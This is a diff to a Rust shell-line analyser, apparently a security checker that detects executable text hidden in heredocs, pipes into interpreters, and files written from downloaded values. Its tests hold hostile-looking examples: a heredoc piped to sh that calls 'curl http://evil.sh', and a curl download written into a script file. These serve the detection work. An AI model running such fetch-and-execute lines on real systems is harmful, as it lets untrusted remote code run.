@@ -92,6 +92,7 @@ pub(crate) fn project(source: &str) -> ShellProjection {
         0,
     );
 
+    let trusted = names_the_masks_trust(tree.root_node(), text.as_bytes(), &masked);
     let mut hide = vec![false; text.len()];
     for range in masked {
         for slot in hide
@@ -137,9 +138,44 @@ pub(crate) fn project(source: &str) -> ShellProjection {
         // every byte in a masked multibyte codepoint is replaced.
         scan: String::from_utf8(bytes).unwrap_or_else(|_| source.to_owned()),
         parsed: true,
-        masks_in_doubt: masks_are_in_doubt(tree.root_node(), text),
+        masks_in_doubt: masks_are_in_doubt(tree.root_node(), text, &trusted),
         names_over_budget,
     }
+}
+
+/// Names the condition reading trusts wherever they stand: a literal
+/// `true` or `false` decides a branch the projection hides.
+const CONDITION_NAMES: [&str; 6] = ["true", "false", ":", "test", "[", "[["];
+
+/// The names of the commands whose words or here-document the projection
+/// masked (`echo` prints, `cat` only reads), and the names a condition is
+/// read by ([`CONDITION_NAMES`]): what a function of the same name would
+/// take the trust from.
+fn names_the_masks_trust(
+    root: tree_sitter::Node<'_>,
+    source: &[u8],
+    masked: &[Range<usize>],
+) -> std::collections::HashSet<String> {
+    let mut trusted: std::collections::HashSet<String> = CONDITION_NAMES
+        .iter()
+        .map(|name| (*name).to_owned())
+        .collect();
+    for range in masked {
+        let Some(node) = root.descendant_for_byte_range(range.start, range.end) else {
+            continue;
+        };
+        let owner = if node.kind() == "heredoc_body" {
+            heredoc_owner(node)
+        } else if node.kind() == "command" {
+            Some(node)
+        } else {
+            ancestor_of_kind(node, "command")
+        };
+        if let Some(name) = owner.and_then(|owner| command_name(owner, source)) {
+            trusted.insert(normalized_command_name(&name));
+        }
+    }
+    trusted
 }
 
 /// Builtins that give a name another meaning with no file at all: an alias,
@@ -158,13 +194,30 @@ const DOUBT_MARKS: [&str; 2] = ["PATH", "$["];
 /// name the shell composes, or changes where names are looked up. Measured
 /// 2026-11-10 in the sandbox: guard lowerings ran behind these while the
 /// projection showed none of their text.
-fn masks_are_in_doubt(root: tree_sitter::Node<'_>, text: &str) -> bool {
+///
+/// A function defined on the line takes the trust from its own name only:
+/// one named as a command whose words or here-document a mask hid, or as a
+/// name a condition is read by ([`names_the_masks_trust`]), puts them in
+/// doubt; one under any other name (`f() { cat >> notes.md <<'EOF' ...`)
+/// leaves the masks of its body and of the line as they are.
+fn masks_are_in_doubt(
+    root: tree_sitter::Node<'_>,
+    text: &str,
+    trusted: &std::collections::HashSet<String>,
+) -> bool {
+    let source = text.as_bytes();
+    let mut definitions = Vec::new();
+    collect_nodes_of_kind(root, "function_definition", &mut definitions, 0);
     if DOUBT_MARKS.iter().any(|mark| text.contains(mark))
-        || node_contains_kind(root, "function_definition", 0)
+        || definitions.into_iter().any(|definition| {
+            function_definition_name(definition, source).is_none_or(|name| {
+                name.contains(['$', '`', '{', '/', '\\', '\'', '"'])
+                    || trusted.contains(&normalized_command_name(&name))
+            })
+        })
     {
         return true;
     }
-    let source = text.as_bytes();
     let runs_unseen_text = |word: &str, is_name: bool| {
         let word = normalized_command_name(word);
         (is_name || word != ".")
@@ -2944,6 +2997,21 @@ fn inline_code_pieces(source: &str) -> Vec<(String, String, bool)> {
             ));
         }
     }
+    // The code a pipe hands an interpreter that reads it from stdin
+    // (`printf '...' | python3`), when the line writes it out.
+    let mut readers = Vec::new();
+    collect_all_commands(tree.root_node(), &mut readers, 0);
+    for reader in readers {
+        if node_is_in_literal_unreachable_branch(reader, bytes) {
+            continue;
+        }
+        let Some(language) = stdin_code_language(reader, bytes) else {
+            continue;
+        };
+        if let Some(PipedInput::Text(code)) = piped_input(reader, bytes) {
+            lines.push((interpreter_language(&language).to_owned(), code, false));
+        }
+    }
     lines
 }
 
@@ -3147,6 +3215,35 @@ pub(crate) fn handed_shell_lines(source: &str) -> HandedLines {
             if shell_code_input(&args) == CodeInput::Stdin {
                 handed.lines.push(stdin_code_text(body, bytes));
             }
+        }
+    }
+    // What a pipe hands a shell that reads its script from stdin (`cat
+    // <<'EOF' | sh`, `printf '...' | bash`), when the line writes it out.
+    // Text it does not write out is held by the reading of unread parts
+    // (`unread_parts::input_from_unread_pipe`), which only lifts an allow.
+    for command in &commands {
+        if node_is_in_literal_unreachable_branch(*command, bytes) {
+            continue;
+        }
+        let Some(words) = command_words(*command, bytes) else {
+            continue;
+        };
+        let Some(effective) = effective_command_words(&words, 0) else {
+            continue;
+        };
+        let name = normalized_command_name(&effective[0]);
+        if !(is_shell_name(&name) || names_a_shell_at_run_time(&effective[0])) {
+            continue;
+        }
+        let args: Vec<String> = effective[1..]
+            .iter()
+            .map(|argument| shell_literal_word(argument))
+            .collect();
+        if shell_code_input(&args) != CodeInput::Stdin {
+            continue;
+        }
+        if let Some(PipedInput::Text(text)) = piped_input(*command, bytes) {
+            handed.lines.push(text);
         }
     }
     handed.lines.retain(|line| !line.trim().is_empty());
@@ -4007,6 +4104,14 @@ pub(crate) fn heredoc_owner(redirect: tree_sitter::Node<'_>) -> Option<tree_sitt
         .parent()
         .filter(|parent| parent.kind() == "redirected_statement")
         .or_else(|| ancestor_of_kind(redirect, "redirected_statement"))?;
+    statement_owner(statement)
+}
+
+/// The command the redirects of a redirected statement belong to: the last
+/// command of the list or pipeline the grammar hangs them on (`cd x && cat
+/// > f` writes `f` from `cat`), also in a subshell or a function; the
+/// first command of a compound body (`if`, `while`), as before.
+pub(crate) fn statement_owner(statement: tree_sitter::Node<'_>) -> Option<tree_sitter::Node<'_>> {
     let mut node = statement.child_by_field_name("body")?;
     for _ in 0..MAX_AST_DEPTH {
         match node.kind() {
@@ -4033,6 +4138,328 @@ fn stdin_code_text(body: tree_sitter::Node<'_>, source: &[u8]) -> String {
     } else {
         text
     }
+}
+
+/// What a pipe hands the command after it on stdin, as far as the line
+/// writes it out ([`piped_input`]).
+#[derive(Clone, Debug, PartialEq)]
+pub(crate) enum PipedInput {
+    /// The text the writer prints, written out on the line.
+    Text(String),
+    /// The writer prints something the line does not write out: a file the
+    /// line did not write, a variable, a substitution, another program.
+    Unread,
+}
+
+/// How many files written on the line, one read from the next, are followed
+/// to find what a `cat` of one prints.
+const PIPED_FILE_LEVELS: u8 = 4;
+
+/// What the pipe before `consumer` hands it on stdin, or `None` when no
+/// pipe does. The writer is the stage before it, or, for the grammar's
+/// `cat <<'EOF' | sh` (the `| sh` hangs inside the here-document), the
+/// command the here-document belongs to ([`heredoc_owner`]).
+///
+/// The text is known when the writer is an `echo` or a `printf` of words
+/// written out, a `cat` of a here-document or here-string written out, or
+/// a `cat` of a file the line wrote before with such text. Anything else
+/// is [`PipedInput::Unread`].
+pub(crate) fn piped_input(consumer: tree_sitter::Node<'_>, source: &[u8]) -> Option<PipedInput> {
+    let unit = consumer
+        .parent()
+        .filter(|parent| parent.kind() == "redirected_statement")
+        .unwrap_or(consumer);
+    let pipeline = unit.parent().filter(|parent| parent.kind() == "pipeline")?;
+    let mut cursor = pipeline.walk();
+    let stages: Vec<_> = pipeline
+        .named_children(&mut cursor)
+        .filter(|stage| stage.kind() != "comment")
+        .collect();
+    let at = stages.iter().position(|stage| *stage == unit)?;
+    if let Some(writer) = at.checked_sub(1).map(|before| stages[before]) {
+        let writer = match writer.kind() {
+            "command" => writer,
+            "redirected_statement" => match writer.child_by_field_name("body") {
+                Some(body) if body.kind() == "command" => body,
+                _ => return Some(PipedInput::Unread),
+            },
+            _ => return Some(PipedInput::Unread),
+        };
+        return Some(printed_text(writer, source, 0).map_or(PipedInput::Unread, PipedInput::Text));
+    }
+    let redirect = pipeline
+        .parent()
+        .filter(|parent| parent.kind() == "heredoc_redirect")?;
+    let writer = heredoc_owner(redirect)?;
+    Some(printed_text(writer, source, 0).map_or(PipedInput::Unread, PipedInput::Text))
+}
+
+/// The text `command` prints, when the line writes it out: see
+/// [`piped_input`].
+fn printed_text(command: tree_sitter::Node<'_>, source: &[u8], level: u8) -> Option<String> {
+    let name = normalized_command_name(&command_name(command, source)?);
+    let arguments = command_arguments(command);
+    if !arguments
+        .iter()
+        .all(|argument| word_is_written_out(*argument, source))
+    {
+        return None;
+    }
+    let words: Vec<String> = arguments
+        .iter()
+        .map(|argument| shell_literal_word(&node_text(*argument, source)))
+        .collect();
+    match name.as_str() {
+        "echo" => {
+            let mut newline = true;
+            let mut escapes = false;
+            let mut rest = words.as_slice();
+            while let Some(flag) = rest.first().and_then(|word| word.strip_prefix('-')) {
+                if flag.is_empty() || !flag.chars().all(|letter| matches!(letter, 'n' | 'e' | 'E'))
+                {
+                    break;
+                }
+                newline &= !flag.contains('n');
+                escapes |= flag.contains('e');
+                rest = &rest[1..];
+            }
+            let text = rest.join(" ");
+            if escapes && text.contains('\\') {
+                return None;
+            }
+            Some(if newline { text + "\n" } else { text })
+        }
+        "printf" => {
+            let rest = match words.first().map(String::as_str) {
+                Some("--") => &words[1..],
+                Some(flag) if flag.starts_with('-') => return None,
+                _ => words.as_slice(),
+            };
+            let (format, values) = rest.split_first()?;
+            printf_text(format, values)
+        }
+        "cat" => {
+            let paths: Vec<&String> = words.iter().filter(|word| word.as_str() != "-").collect();
+            if words
+                .iter()
+                .any(|word| word.starts_with('-') && word.as_str() != "-")
+            {
+                return None;
+            }
+            if paths.is_empty() {
+                return stdin_text_of(command, source);
+            }
+            if level >= PIPED_FILE_LEVELS {
+                return None;
+            }
+            let mut text = String::new();
+            for path in paths {
+                text.push_str(&written_file_text(command, path, source, level + 1)?);
+            }
+            Some(text)
+        }
+        _ => None,
+    }
+}
+
+/// The text a here-document or here-string written out hands `command`
+/// on stdin.
+pub(crate) fn stdin_text_of(command: tree_sitter::Node<'_>, source: &[u8]) -> Option<String> {
+    let mut cursor = command.walk();
+    let own: Vec<_> = command.children(&mut cursor).collect();
+    let mut inputs: Vec<tree_sitter::Node<'_>> = own
+        .into_iter()
+        .filter(|child| child.kind() == "herestring_redirect")
+        .collect();
+    let mut node = command;
+    while let Some(parent) = node.parent() {
+        match parent.kind() {
+            "redirected_statement" => {
+                let mut cursor = parent.walk();
+                let children: Vec<_> = parent.children(&mut cursor).collect();
+                inputs.extend(children.into_iter().filter(|child| {
+                    matches!(child.kind(), "heredoc_redirect" | "herestring_redirect")
+                        && heredoc_owner(*child).is_some_and(|owner| owner.id() == command.id())
+                }));
+            }
+            "list" | "pipeline" => {}
+            _ => break,
+        }
+        node = parent;
+    }
+    // The last input redirect is the one the command reads.
+    let input = inputs.into_iter().max_by_key(|input| input.start_byte())?;
+    if input.kind() == "herestring_redirect" {
+        let mut cursor = input.walk();
+        let words: Vec<_> = input.named_children(&mut cursor).collect();
+        let [word] = words.as_slice() else {
+            return None;
+        };
+        if !word_is_written_out(*word, source) {
+            return None;
+        }
+        return Some(shell_literal_word(&node_text(*word, source)) + "\n");
+    }
+    let mut bodies = Vec::new();
+    collect_nodes_of_kind(input, "heredoc_body", &mut bodies, 0);
+    let body = bodies.into_iter().find(|body| {
+        body.parent()
+            .is_some_and(|parent| parent.id() == input.id())
+    })?;
+    let text = node_text(body, source);
+    let quoted = first_descendant_of_kind(input, "heredoc_start", 0)
+        .is_some_and(|start| node_text(start, source).contains(['\'', '"', '\\']));
+    if quoted {
+        return Some(text);
+    }
+    let mut cursor = body.walk();
+    let expands = body
+        .named_children(&mut cursor)
+        .any(|part| part.kind() != "heredoc_content");
+    if expands || text.contains(['$', '`']) {
+        return None;
+    }
+    Some(text.replace("\\\\", "\\"))
+}
+
+/// What the line wrote to `path` before `reader` reads it, when every
+/// write is text written out ([`printed_text`]). `None` when the line
+/// wrote no such file, or wrote it with text it does not show.
+fn written_file_text(
+    reader: tree_sitter::Node<'_>,
+    path: &str,
+    source: &[u8],
+    level: u8,
+) -> Option<String> {
+    let mut redirects = Vec::new();
+    collect_nodes_of_kind(root_node(reader), "file_redirect", &mut redirects, 0);
+    redirects.sort_by_key(|redirect| redirect.start_byte());
+    let mut text: Option<String> = None;
+    for redirect in redirects {
+        if redirect.start_byte() >= reader.start_byte() {
+            break;
+        }
+        let Some(destination) = redirect.child_by_field_name("destination") else {
+            continue;
+        };
+        let operator = node_text(redirect, source);
+        let operator = operator
+            .get(
+                ..destination
+                    .start_byte()
+                    .saturating_sub(redirect.start_byte()),
+            )
+            .unwrap_or_default()
+            .trim()
+            .to_owned();
+        if !matches!(operator.as_str(), ">" | ">>" | ">|" | "&>" | "&>>") {
+            continue;
+        }
+        if !word_is_written_out(destination, source)
+            || shell_literal_word(&node_text(destination, source)) != path
+        {
+            continue;
+        }
+        let writer = ancestor_of_kind(redirect, "redirected_statement").and_then(statement_owner);
+        let printed = writer.and_then(|writer| printed_text(writer, source, level))?;
+        text = Some(if operator.ends_with(">>") {
+            text.unwrap_or_default() + &printed
+        } else {
+            printed
+        });
+    }
+    text
+}
+
+/// Whether a word holds only text the line writes out: no expansion,
+/// substitution, glob, brace or tilde the shell would turn into something
+/// else, and no `$'...'` escape left undecoded.
+fn word_is_written_out(word: tree_sitter::Node<'_>, source: &[u8]) -> bool {
+    const EXPANDING: [&str; 7] = [
+        "simple_expansion",
+        "expansion",
+        "command_substitution",
+        "process_substitution",
+        "arithmetic_expansion",
+        "brace_expression",
+        "translated_string",
+    ];
+    if EXPANDING
+        .iter()
+        .any(|kind| word.kind() == *kind || node_contains_kind(word, kind, 0))
+    {
+        return false;
+    }
+    let mut stack = vec![word];
+    while let Some(node) = stack.pop() {
+        let text = node_text(node, source);
+        match node.kind() {
+            "word" if text.contains(['*', '?', '[', '{', '~', '\\']) => return false,
+            "ansi_c_string" if text.contains('\\') => return false,
+            _ => {}
+        }
+        let mut cursor = node.walk();
+        stack.extend(node.named_children(&mut cursor));
+    }
+    true
+}
+
+/// What `printf FORMAT VALUES...` prints, for the directives read here
+/// (`%s`, `%b`, `%d`, `%%`); `None` for any other.
+fn printf_text(format: &str, values: &[String]) -> Option<String> {
+    let mut out = String::new();
+    let mut values = values.iter();
+    loop {
+        let mut used = false;
+        let mut chars = format.chars().peekable();
+        while let Some(character) = chars.next() {
+            match character {
+                '\\' => out.push_str(&printf_escape(&mut chars)?),
+                '%' => match chars.next()? {
+                    '%' => out.push('%'),
+                    's' | 'd' => {
+                        used = true;
+                        out.push_str(values.next().map(String::as_str).unwrap_or_default());
+                    }
+                    'b' => {
+                        used = true;
+                        let value = values.next().map(String::as_str).unwrap_or_default();
+                        let mut value = value.chars().peekable();
+                        while let Some(character) = value.next() {
+                            if character == '\\' {
+                                out.push_str(&printf_escape(&mut value)?);
+                            } else {
+                                out.push(character);
+                            }
+                        }
+                    }
+                    _ => return None,
+                },
+                _ => out.push(character),
+            }
+        }
+        if !used || values.len() == 0 {
+            return Some(out);
+        }
+    }
+}
+
+/// The character a backslash escape of `printf` stands for, after the
+/// backslash; `None` for one not read here (octal, hex, unicode).
+fn printf_escape(chars: &mut std::iter::Peekable<std::str::Chars<'_>>) -> Option<String> {
+    Some(
+        match chars.next() {
+            Some('n') => "\n",
+            Some('t') => "\t",
+            Some('r') => "\r",
+            Some('\\') | None => "\\",
+            Some('"') => "\"",
+            Some('\'') => "'",
+            Some('a' | 'b' | 'f' | 'v' | 'e' | 'c' | '0'..='7' | 'x' | 'u' | 'U') => return None,
+            Some(other) => return Some(format!("\\{other}")),
+        }
+        .to_owned(),
+    )
 }
 
 /// What the first argument of a Node function that starts a process is.
@@ -5501,10 +5928,18 @@ pub(crate) fn download_tainted_variable_output_targets(source: &str) -> Vec<(usi
             continue;
         }
         let (scope, targets) = command_output_scope(command, bytes);
-        if targets.is_empty() || !node_expands_tainted_variable(scope, bytes, &tainted) {
+        if targets.is_empty()
+            || !scope
+                .iter()
+                .any(|node| node_expands_tainted_variable(*node, bytes, &tainted))
+        {
             continue;
         }
-        let end = scope.end_byte();
+        let end = scope
+            .iter()
+            .map(|node| node.end_byte())
+            .max()
+            .unwrap_or_default();
         outputs.extend(targets.into_iter().map(|target| (end, target)));
     }
     outputs.sort_unstable();
@@ -5520,7 +5955,19 @@ pub(crate) fn download_tainted_variable_output_targets(source: &str) -> Vec<(usi
 fn command_output_scope<'tree>(
     command: tree_sitter::Node<'tree>,
     source: &[u8],
-) -> (tree_sitter::Node<'tree>, Vec<String>) {
+) -> (Vec<tree_sitter::Node<'tree>>, Vec<String>) {
+    // The node and the redirects that carry its output: the redirected
+    // statement whole when the node is its body, or the node and those
+    // redirects when the grammar hung them on a list the node ends.
+    let scope_of = |node: tree_sitter::Node<'tree>, redirected: tree_sitter::Node<'tree>| {
+        if redirected.child_by_field_name("body") == Some(node) {
+            return vec![redirected];
+        }
+        let mut scope = vec![node];
+        let mut cursor = redirected.walk();
+        scope.extend(redirected.children_by_field_name("redirect", &mut cursor));
+        scope
+    };
     if let Some(pipeline) = command.parent().and_then(nearest_pipeline) {
         let mut targets = tee_output_targets(pipeline, source);
         let mut members = Vec::new();
@@ -5535,26 +5982,36 @@ fn command_output_scope<'tree>(
         }
         if let Some(redirected) = redirect_owner(pipeline) {
             targets.extend(output_redirect_targets(redirected, source));
+            return (scope_of(pipeline, redirected), targets);
         }
-        return (pipeline, targets);
+        return (vec![pipeline], targets);
     }
     let mut targets = tee_output_targets(command, source);
     match redirect_owner(command) {
         Some(redirected) => {
             targets.extend(output_redirect_targets(redirected, source));
-            (redirected, targets)
+            (scope_of(command, redirected), targets)
         }
-        None => (command, targets),
+        None => (vec![command], targets),
     }
 }
 
 /// The redirected statement whose redirects apply to `node`, climbing only
-/// through `list` nodes (see [`command_output_scope`]).
+/// through `list` nodes (see [`command_output_scope`]). The grammar hangs
+/// the redirect of `a && b > f` on the list, and the shell gives it to `b`
+/// alone ([`statement_owner`]): `a` writes nothing there.
 fn redirect_owner(node: tree_sitter::Node<'_>) -> Option<tree_sitter::Node<'_>> {
     let mut current = node;
     while let Some(parent) = current.parent() {
         match parent.kind() {
-            "redirected_statement" => return Some(parent),
+            "redirected_statement" => {
+                return statement_owner(parent)
+                    .is_some_and(|owner| {
+                        node.start_byte() <= owner.start_byte()
+                            && owner.end_byte() <= node.end_byte()
+                    })
+                    .then_some(parent);
+            }
             "list" => current = parent,
             _ => return None,
         }
@@ -5727,7 +6184,9 @@ fn command_writes_download_tainted_value(
         return false;
     }
     let tainted = tainted_names_at(taint.timeline(command, source), command.start_byte());
-    node_expands_tainted_variable(scope, source, &tainted)
+    scope
+        .into_iter()
+        .any(|node| node_expands_tainted_variable(node, source, &tainted))
 }
 
 /// Whether `node` expands one of `tainted` as CONTENT: not inside a redirect
@@ -12217,6 +12676,28 @@ mod tests {
         assert!(
             projected.scan.contains("curl http://evil.sh"),
             "a heredoc feeding sh is executable and must not be masked"
+        );
+    }
+
+    /// The redirect the grammar hangs on a list belongs to the list's last
+    /// command, as the shell gives it: in `echo "$f" && echo ok > r.sh` the
+    /// downloaded value goes to stdout, and `r.sh` holds `ok`.
+    /// FAILS ON REVERT of the owner check in `redirect_owner`: the first
+    /// line names `r.sh` as written from the download.
+    #[test]
+    fn a_list_redirect_belongs_to_its_last_command() {
+        let targets = |line: &str| {
+            download_tainted_variable_output_targets(line)
+                .into_iter()
+                .map(|(_, target)| target)
+                .collect::<Vec<_>>()
+        };
+        assert!(
+            targets("f=$(curl -s https://e.example/p); echo \"$f\" && echo ok > r.sh").is_empty()
+        );
+        assert_eq!(
+            targets("f=$(curl -s https://e.example/p); cd x && echo \"$f\" > r.sh"),
+            vec!["r.sh".to_owned()]
         );
     }
 
